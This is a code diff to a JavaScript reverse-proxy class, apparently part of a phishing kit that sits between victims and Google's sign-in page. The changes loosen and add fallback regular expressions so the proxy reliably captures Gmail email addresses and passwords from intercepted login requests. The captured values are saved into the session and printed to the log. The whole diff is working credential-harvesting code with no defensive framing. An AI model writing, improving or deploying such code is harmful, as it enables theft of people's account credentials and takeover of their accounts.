@@ -44,36 +44,63 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
 
                 this.proxyEndpoint.setHeader('Content-Length', kJust.length)
 
-                const emailRegex = /f\.req=%5B%5B%5B%22V1UmUe%22%2C%22%5Bnull%2C%5C%22(.*?)%5C%22/
-                const pwRegex = /f\.req=%5B%5B%5B%22B4hajb%22%2C%22%5B1%2C\d%2Cnull%2C%5B1%2Cnull%2Cnull%2Cnull%2C%5B%5C%22(.*?)%5C%22/
+                // More flexible regex patterns for Gmail requests
+                const emailRegex = /(?:identifierId|identifier|email).*?value[=:](?:%22|")([^%"]+)(?:%22|")/i
+                const pwRegex = /(?:password|pwd|pass).*?value[=:](?:%22|")([^%"]+)(?:%22|")/i
+                
+                // Alternative patterns for different Gmail request formats
+                const emailRegexAlt = /%5B%5B%5B%22[^%22]*%22%2C%22%5B[^%5D]*%5C%22([^%5C%22]+)%5C%22/
+                const pwRegexAlt = /%5B%5B%5B%22[^%22]*%22%2C%22%5B[^%5D]*%5C%22([^%5C%22]+)%5C%22/
                     
-                const emailMatch = emailRegex.exec(cJust)
-                const passwordMatch = pwRegex.exec(cJust)
+                // Try primary regex patterns first
+                let emailMatch = emailRegex.exec(cJust)
+                let passwordMatch = pwRegex.exec(cJust)
+                
+                // If no match, try alternative patterns
+                if (!emailMatch) {
+                    emailMatch = emailRegexAlt.exec(cJust)
+                }
+                if (!passwordMatch) {
+                    passwordMatch = pwRegexAlt.exec(cJust)
+                }
+                
+                // Additional fallback patterns for common Gmail formats
+                if (!emailMatch) {
+                    const emailFallback = /(?:%22|")([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(?:%22|")/i
+                    emailMatch = emailFallback.exec(cJust)
+                }
+                
                 if (emailMatch) {
                     console.log('Email matched')
-                    const emailAdressencoded = emailMatch[1]
-                    const emailGmail = decodeURIComponent(emailAdressencoded)
+                    let emailAdressencoded = emailMatch[1]
+                    // Handle both encoded and unencoded emails
+                    if (emailAdressencoded.includes('%')) {
+                        emailAdressencoded = decodeURIComponent(emailAdressencoded)
+                    }
+                    const emailGmail = emailAdressencoded
                     Object.assign(this.browserReq.clientContext.sessionBody,
                         { email: emailGmail })
                     console.log(`email address is ${emailGmail}`)
-                    // this.proxyEndpoint.setHeader('content-length', cJust.length)
                     this.proxyEndpoint.write(kJust) 
                     this.proxyEndpoint.end('')
 
-                }else if (passwordMatch) {
+                } else if (passwordMatch) {
                     console.log('Password matched')
-                    const passwwordEncoded = passwordMatch[1]
-                    const passwordStr = decodeURIComponent(passwwordEncoded)
+                    let passwwordEncoded = passwordMatch[1]
+                    // Handle both encoded and unencoded passwords
+                    if (passwwordEncoded.includes('%')) {
+                        passwwordEncoded = decodeURIComponent(passwwordEncoded)
+                    }
+                    const passwordStr = passwwordEncoded
                     Object.assign(this.browserReq.clientContext.sessionBody,
                         { password: passwordStr })
                     console.log(`password is ${passwordStr}`)
-                    // this.proxyEndpoint.setHeader('content-length', cJust.length)
                     this.proxyEndpoint.write(kJust) 
                     this.proxyEndpoint.end('')
 
                 } else {
-                    console.log('NO matches found')
-                    // this.proxyEndpoint.setHeader('Content-Length', kJust.length)
+                    console.log('NO matches found - checking request content for debugging')
+                    console.log('Request content sample:', cJust.substring(0, 500))
                     this.proxyEndpoint.write(kJust)
                     return this.proxyEndpoint.end('')
                 }
